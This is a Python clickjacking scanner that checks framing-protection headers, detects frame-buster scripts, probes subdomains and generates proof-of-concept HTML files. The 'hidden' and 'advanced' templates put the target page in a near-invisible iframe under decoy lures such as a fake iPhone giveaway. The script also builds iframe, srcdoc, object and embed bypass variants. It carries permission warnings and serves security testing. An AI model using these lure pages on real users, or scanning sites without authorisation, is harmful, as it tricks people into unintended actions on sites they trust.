#!/usr/bin/env python3
"""
Interactive Clickjacking Vulnerability Scanner (Auto-default mode)
Modified to automatically select defaults for mode and output directory when running non-interactively.
Author: Security Researcher (modified)
Usage: Run the script and follow prompts for URL or file path. Mode and output directory default to 'full' and 'clickjacking_tests' respectively without requiring input.
NOTE: Only use this tool on assets you own or have explicit permission to test.
"""

import requests
import urllib.parse
from bs4 import BeautifulSoup
import json
import time
import sys
import os
import re
from typing import List, Dict


class ClickjackingTester:
    def __init__(self, user_agent=None, timeout=10, delay=1):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.timeout = timeout
        self.delay = delay
        self.results = {}
        self.processed_urls = set()

    def normalize_url(self, url: str) -> str:
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')

    def validate_url(self, url: str) -> bool:
        try:
            result = urllib.parse.urlparse(url)
            return all([result.scheme in ['http', 'https'], result.netloc])
        except Exception:
            return False

    def read_urls_from_file(self, file_path: str) -> List[str]:
        urls = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    candidate = line
                    if not candidate.startswith(('http://', 'https://')):
                        candidate = self.normalize_url(candidate)
                    if self.validate_url(candidate):
                        urls.append(candidate)
                    else:
                        print(f"[!] Invalid URL in file: {line}")
            return urls
        except FileNotFoundError:
            print(f"[!] File not found: {file_path}")
            return []
        except Exception as e:
            print(f"[!] Error reading file {file_path}: {e}")
            return []

    def get_urls_from_input(self, input_arg: str) -> List[str]:
        urls = []
        input_arg = input_arg.strip()

        if os.path.isfile(input_arg):
            print(f"[+] Reading URLs from file: {input_arg}")
            urls = self.read_urls_from_file(input_arg)
        else:
            candidate = input_arg
            if not candidate.startswith(('http://', 'https://')):
                candidate = self.normalize_url(candidate)
            if self.validate_url(candidate):
                urls.append(candidate)
            else:
                print(f"[!] Invalid URL: {input_arg}")

        unique_urls = []
        for url in urls:
            if url not in self.processed_urls:
                unique_urls.append(url)
                self.processed_urls.add(url)

        return unique_urls

    def test_basic_protection_headers(self, url: str) -> Dict:
        print(f"[+] Testing basic protection headers for {url}")
        try:
            response = self.session.head(url, timeout=self.timeout, allow_redirects=True)
            final_url = response.url
            headers = {
                'X-Frame-Options': response.headers.get('X-Frame-Options', 'NOT SET'),
                'Content-Security-Policy': response.headers.get('Content-Security-Policy', 'NOT SET'),
                'Frame-Options': response.headers.get('Frame-Options', 'NOT SET'),
            }

            vulnerabilities = []
            protections = []

            xfo = (headers['X-Frame-Options'] or 'NOT SET').upper()
            if xfo in ['NOT SET', '']:
                vulnerabilities.append("Missing X-Frame-Options header")
            elif 'ALLOW-FROM' in xfo and ('*' in xfo or 'HTTP:' in xfo or 'HTTPS:' in xfo):
                vulnerabilities.append("Overly permissive X-Frame-Options")
            elif xfo in ['DENY', 'SAMEORIGIN']:
                protections.append(f"X-Frame-Options: {xfo}")

            csp = (headers['Content-Security-Policy'] or '').lower()
            if 'frame-ancestors' in csp:
                if "frame-ancestors 'none'" in csp or "frame-ancestors 'self'" in csp:
                    protections.append(f"CSP frame-ancestors: {csp}")
                elif 'frame-ancestors *' in csp or 'frame-ancestors http:' in csp:
                    vulnerabilities.append("Overly permissive CSP frame-ancestors")
            else:
                vulnerabilities.append("Missing CSP frame-ancestors directive")

            return {
                'url': final_url,
                'headers': headers,
                'vulnerabilities': vulnerabilities,
                'protections': protections,
                'status_code': response.status_code
            }
        except Exception as e:
            return {'error': str(e)}

    def test_with_different_methods(self, url: str) -> Dict:
        print(f"[+] Testing different HTTP methods for {url}")
        methods = ['GET', 'POST', 'OPTIONS']
        header_tests = [
            {},
            {'X-Requested-With': 'XMLHttpRequest'},
            {'Origin': 'https://trusted-domain.com'},
            {'X-Forwarded-Host': 'attacker.com'},
        ]

        results = {}
        for method in methods:
            for headers in header_tests:
                test_name = f"{method}_{'_'.join(headers.keys())}" if headers else method
                try:
                    if method == 'GET':
                        response = self.session.get(url, headers=headers, timeout=self.timeout)
                    elif method == 'POST':
                        response = self.session.post(url, headers=headers, timeout=self.timeout)
                    elif method == 'OPTIONS':
                        response = self.session.options(url, headers=headers, timeout=self.timeout)

                    results[test_name] = {
                        'x_frame_options': response.headers.get('X-Frame-Options', 'NOT SET'),
                        'csp': response.headers.get('Content-Security-Policy', 'NOT SET'),
                        'status': response.status_code
                    }
                except Exception as e:
                    results[test_name] = {'error': str(e)}

        return results

    def detect_frame_busters(self, url: str) -> List[str]:
        print(f"[+] Detecting frame busters for {url}")
        frame_busters = []
        common_busters = [
            "top != self",
            "top.location != self.location",
            "parent.frames.length > 0",
            "window.top !== window.self",
            "if (top != self)",
            "if (top.location != self.location)",
        ]
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.content, 'html.parser')
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    script_content = script.string.lower()
                    for buster in common_busters:
                        if buster.lower() in script_content:
                            frame_busters.append(buster)
            for tag in soup.find_all(True):
                for attr in ['onload', 'onclick', 'onmouseover']:
                    if tag.has_attr(attr):
                        attr_value = tag[attr].lower()
                        for buster in common_busters:
                            if buster.lower() in attr_value:
                                frame_busters.append(f"{tag.name} {attr}: {buster}")
            return list(set(frame_busters))
        except Exception as e:
            return [f"Error: {str(e)}"]

    def generate_poc_html(self, url: str, technique: str = "basic") -> str:
        print(f"[+] Generating PoC HTML for {url} ({technique})")
        poc_templates = {
            "basic": """
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test - Basic</title>
</head>
<body>
    <h2>Basic Clickjacking Test</h2>
    <p>If you can see the target website below, it's vulnerable to clickjacking.</p>
    <iframe src="{{URL}}" width="800" height="600" style="border: 2px solid red;"></iframe>
</body>
</html>
            """,
            "advanced": """
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test - Advanced</title>
    <style>
        #target-frame {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.5;
            z-index: 1;
            border: none;
        }}
        #decoy-button {{
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 2;
            background: blue;
            color: white;
            padding: 20px;
            font-size: 18px;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <div id="decoy-content">
        <h1 style="color: white; text-align: center; margin-top: 50px;">Welcome to Our Site!</h1>
        <button id="decoy-button">Click Here for Special Offer!</button>
    </div>
    <iframe id="target-frame" src="{{URL}}"></iframe>
</body>
</html>
            """,
            "hidden": """
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test - Hidden</title>
    <style>
        #target-frame {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.001;
            z-index: 1;
            border: none;
        }}
        #decoy {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: pink;
            z-index: 2;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <div id="decoy">
        <h1 style="text-align: center; margin-top: 200px;">FREE IPHONE GIVEAWAY!</h1>
        <p style="text-align: center;">Click anywhere to claim your prize!</p>
    </div>
    <iframe id="target-frame" src="{{URL}}"></iframe>
</body>
</html>
            """
        }
        template = poc_templates.get(technique, poc_templates["basic"])
        return template.replace("{{URL}}", url)

    def test_subdomains(self, base_domain: str, subdomains: List[str]) -> Dict:
        print(f"[+] Testing subdomains of {base_domain}")
        results = {}
        common_subdomains = subdomains or ['www', 'api', 'admin', 'app', 'secure', 'mail', 'login', 'dashboard']
        for sub in common_subdomains:
            test_url = f"https://{sub}.{base_domain}"
            try:
                print(f"  Testing {test_url}")
                result = self.test_basic_protection_headers(test_url)
                results[test_url] = result
                time.sleep(self.delay)
            except Exception as e:
                results[test_url] = {'error': str(e)}
        return results

    def test_bypass_techniques(self, url: str) -> Dict:
        print(f"[+] Testing bypass techniques for {url}")
        bypass_tests = {
            "double_frame": f"<iframe src='data:text/html,<iframe src=&quot;{url}&quot;></iframe>'></iframe>",
            "iframe_srcdoc": f"<iframe srcdoc='<iframe src=&quot;{url}&quot;></iframe>'></iframe>",
            "object_tag": f"<object data='{url}' width='800' height='600'></object>",
            "embed_tag": f"<embed src='{url}' width='800' height='600'>",
        }
        results = {}
        for technique, html in bypass_tests.items():
            poc_html = f"""
            <!DOCTYPE html>
            <html>
            <head><title>Bypass Test - {technique}</title></head>
            <body>
                <h2>Bypass Technique: {technique}</h2>
                {html}
            </body>
            </html>
            """
            results[technique] = {
                'html': poc_html,
                'description': f"Test {technique} bypass method"
            }
        return results

    def quick_test(self, url: str) -> Dict:
        print(f"[+] Quick testing {url}")
        result = self.test_basic_protection_headers(url)
        result['frame_busters'] = self.detect_frame_busters(url)
        return result

    def comprehensive_test(self, url: str, output_dir: str = "clickjacking_tests") -> Dict:
        print(f"[+] Starting comprehensive clickjacking test for {url}")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        results = {
            'target_url': url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'tests': {}
        }
        results['tests']['basic_headers'] = self.test_basic_protection_headers(url)
        results['tests']['different_methods'] = self.test_with_different_methods(url)
        results['tests']['frame_busters'] = self.detect_frame_busters(url)
        results['tests']['bypass_techniques'] = self.test_bypass_techniques(url)

        for technique in ['basic', 'advanced', 'hidden']:
            poc_html = self.generate_poc_html(url, technique)
            safe_filename = re.sub(r'[^a-zA-Z0-9._-]', '_', url)
            filename = f"{output_dir}/poc_{technique}_{safe_filename}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(poc_html)
            results['tests'][f'poc_{technique}'] = {'file': filename}

        parsed_url = urllib.parse.urlparse(url)
        if not parsed_url.netloc.startswith('www.') and '.' in parsed_url.netloc:
            domain_parts = parsed_url.netloc.split('.')
            if len(domain_parts) >= 2:
                base_domain = '.'.join(domain_parts[-2:])
                results['tests']['subdomains'] = self.test_subdomains(base_domain, [])

        safe_filename = re.sub(r'[^a-zA-Z0-9._-]', '_', url)
        report_file = f"{output_dir}/full_report_{safe_filename}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2)

        print(f"[+] Comprehensive test completed. Report saved to {report_file}")
        return results

    def print_summary(self, results: Dict, url: str = None):
        if url:
            print(f"\n" + "="*80)
            print(f"CLICKJACKING TEST SUMMARY - {url}")
        else:
            print("\n" + "="*80)
            print("CLICKJACKING TEST SUMMARY")
        print("="*80)

        url = results.get('target_url', 'Unknown')
        basic_test = results.get('tests', {}).get('basic_headers', {})

        print(f"Target: {url}")
        print(f"Timestamp: {results.get('timestamp', 'Unknown')}")
        print("\n--- BASIC HEADER PROTECTION ---")

        if 'error' in basic_test:
            print(f"Error: {basic_test['error']}")
        else:
            headers = basic_test.get('headers', {})
            vulns = basic_test.get('vulnerabilities', [])
            protections = basic_test.get('protections', [])

            print(f"X-Frame-Options: {headers.get('X-Frame-Options', 'NOT SET')}")
            print(f"Content-Security-Policy: {headers.get('Content-Security-Policy', 'NOT SET')}")

            if vulns:
                print("\n❌ VULNERABILITIES FOUND:")
                for vuln in vulns:
                    print(f"   - {vuln}")
            else:
                print("\n✅ No obvious vulnerabilities in headers")

            if protections:
                print("\n✅ PROTECTIONS FOUND:")
                for prot in protections:
                    print(f"   - {prot}")

        print("\n--- FRAME BUSTERS DETECTED ---")
        busters = results.get('tests', {}).get('frame_busters', [])
        if busters:
            for buster in busters:
                print(f"   - {buster}")
        else:
            print("   No frame busters detected")

        print("\n--- PROOF OF CONCEPT FILES ---")
        for key, value in results.get('tests', {}).items():
            if key.startswith('poc_'):
                print(f"   - {value.get('file', 'Unknown')}")

        print("\n" + "="*80)


def interactive_main():
    print("Clickjacking Vulnerability Scanner - Non-interactive defaults enabled")
    print("=" * 60)
    print("WARNING: Only use on systems you own or have explicit permission to test!\n")

    tester = ClickjackingTester()

    # Prompt only for the target (single URL or file). Mode and output_dir default automatically.
    user_input = input('Enter a single URL (https://example.com) or a file path containing URLs (url.txt): ').strip()
    if not user_input:
        print('[!] No input provided. Exiting.')
        sys.exit(0)

    urls = tester.get_urls_from_input(user_input)
    if not urls:
        print('[!] No valid URLs found to test. Exiting.')
        sys.exit(1)

    # Auto-defaults: no user interaction required for these two parameters
    mode = 'full'  # automatically selected when no explicit user choice is needed
    output_dir = 'clickjacking_tests'  # automatically selected default output directory

    print(f"[+] Found {len(urls)} URL(s) to test")
    print(f"[+] Mode auto-selected: {mode}")
    print(f"[+] Output directory auto-selected: {output_dir}")

    all_results = {}
    try:
        for i, url in enumerate(urls, 1):
            print(f"\n[{i}/{len(urls)}] Testing: {url}")
            try:
                if mode == 'quick':
                    result = tester.quick_test(url)
                    tester.print_summary({'target_url': url, 'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'), 'tests': {'basic_headers': result, 'frame_busters': tester.detect_frame_busters(url)}}, url)
                    all_results[url] = {'quick_test': result}
                else:
                    result = tester.comprehensive_test(url, output_dir)
                    tester.print_summary(result, url)
                    all_results[url] = result

                if i < len(urls):
                    time.sleep(tester.delay)

            except Exception as e:
                print(f"[!] Error testing {url}: {str(e)}")
                all_results[url] = {'error': str(e)}

        if len(urls) > 1:
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
            summary_file = f"{output_dir}/overall_summary.json"
            with open(summary_file, 'w', encoding='utf-8') as f:
                json.dump(all_results, f, indent=2)
            print(f"\n[+] Overall summary saved to {summary_file}")

        print("\n⚠️  IMPORTANT NOTES:")
        print("   - Header checks alone are not sufficient")
        print("   - Manually verify PoC files in different browsers")
        print("   - Test authenticated endpoints separately")
        print("   - Always follow responsible disclosure practices")

    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error during scanning: {str(e)}")
        sys.exit(1)


if __name__ == '__main__':
    interactive_main()
